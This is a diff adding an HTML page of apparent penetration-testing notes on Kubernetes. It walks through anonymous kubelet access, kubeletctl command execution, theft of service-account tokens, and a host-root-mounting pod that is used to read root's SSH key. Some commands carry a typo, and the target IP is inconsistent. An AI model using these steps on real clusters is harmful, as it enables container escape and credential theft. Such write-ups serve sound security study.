@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Kubernetes (TCP/2379, TCP/2380, TCP/6443, TCP/10251, TCP/10252, TCP/10250, TCP/10255)</h1>
+            <p>An open source system to deploy, scale, and manage containerized applications anywhere. The difference with docker is that kubernetes orchestrates containers</p>
+        </div>
+        <div class="notion-body">
+            <h2>How it works</h2>
+            <ul>
+                <p>Kubernetes works by controlling a cluster of machines. and it has two main components</p>
+                <ul>
+                    <li><b>Control Plane</b> which acts as the brain of the application. We can find several parts</li>
+                    <br>
+                    <ul>
+                        <li><b>API Server</b>: main interface to Kubernetes  (TCP/6443)</li>
+                        <li><b>Scheduler</b>: decides which machine runs each container  (TCP/10251)</li>
+                        <li><b>Controller Manager</b>: ensures the system matches the desired state  (TCP/10252)</li>
+                        <li><b>etcd</b>: database storing cluster configuration   (TCP/2379, 2380)</li>
+                    </ul>
+                    <br>
+                    <li><b>Worker nodes</b> which actually run the containers using nodes</li>
+                    <br>
+                    <ul>
+                        <li><b>Kubelet</b>: API exposed in every node (TCP/10250, 10255)</li>
+                        <li><b>Container runtime</b>: runs containers (Docker, containerd)</li>
+                        <li><b>Kube-proxy</b>: networking for services</li>
+                    </ul>
+                </ul>
+                <br>
+                <p>Here goes a graphic representation of the architechture</p>
+                <img style="border: 1px solid; width: 70%; height: 70%;" src="/H4ckV4ult/images/protocolsImages/kubernetes-cluster-architecture.svg">
+            </ul>
+
+            <h2>Enumeration</h2>
+            <ul>
+                <h3>API Interaction</h3>
+                <ul>
+                <p>The kubelet which as we told is API present for every node can be configured to permit anonymous access. Indeed By default, the Kubelet allows anonymous access</p>
+                <p>Meaning that we could perform the following requests</p>
+                <pre><code class="language-bash">curl https://10.129.10.11:6443 -k
+curl https://10.129.10.11:10250/pods -k | jq . #To get pods</code></pre>
+                </ul>
+                
+                <h3>Interacting with Kubeletctl</h3>
+                <ul>
+                    <p>In case you have access to Kubeletctl we can use some commands to view information</p>
+                    <pre><code class="language-bash">kubeletctl -i --server 10.129.10.11 pods  #Extracting pods</code></pre>    
+                </ul>
+            </ul>
+            
+            <h2>Privilege escalation</h2>
+            <ul>
+                <p>We can use <b>scan rce in order to show which pods are vulnerable to RCE.</b></p>
+                <pre><code class="language-bash">kubeletctl -i --server 10.129.10.11 scan rce</code></pre>
+                <p>Then we can use the following command to RCE inside a container</p>
+                <pre><code class="language-bash">kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx</code></pre>
+                <p>Based on the result of that <b>id</b> command we can escalate fruther to access the host system</p>
+                <p>First we need to get the <b>Kubernetes service account token</b> and the <b>certificate (ca.crt)</b>from the target server. We can obtain the token by doing</p>
+                <pre><code class="language-bash">kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token</code></pre>
+                <p>And the certificate by doing</p>
+                <pre><code class="language-bash">kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt</code></pre>
+                <p>Now that we have both we can check the access rights in the Kubernetes cluster. </p>
+                <pre><code class="language-bash">export token=`cat k8.token`
+kubectl --token=$token --certificate-authority=ca.crt -- server=https://10.129.10.11:6443 auth can-i --list</code></pre>
+                <p>From that output we should search for the <b>pod</b> permissions. It would be very nice to have <b>get create list</b> permissions over pods</p>
+                <p>Now we will create a yaml file that we can use to create a new container and mount the entire file system of the host</p>
+                <pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true</code></pre>    
+                <p>Once created, create the pod and check if its running</p>
+                <pre><code class="language-bash">kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods</code></pre>
+                <p>Then access the container or obtain files</p>
+                <pre><code class="language-bash">kubeletctl --server 10.129.10.11 exec "/bin/bash" -p privesc -c privesc
+kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc</code></pre>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
